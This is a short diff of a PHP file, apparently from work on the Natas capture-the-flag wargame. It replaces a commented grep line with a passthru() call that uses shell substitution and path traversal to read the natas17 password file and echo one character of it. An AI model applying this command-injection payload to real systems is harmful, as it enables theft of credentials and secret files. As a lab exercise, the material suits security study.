@@ -1,5 +1,3 @@
 <?php
-    //passthru("grep -i \"$key\" dictionary.txt");
-    echo "\"";
-    echo chr(34);
+    passthru("$(arr=($(cat ../../../../../../etc/natas_webpass/natas17))\r\nword=${arr[0]}\r\necho ${word: 1: 1})");
 ?>
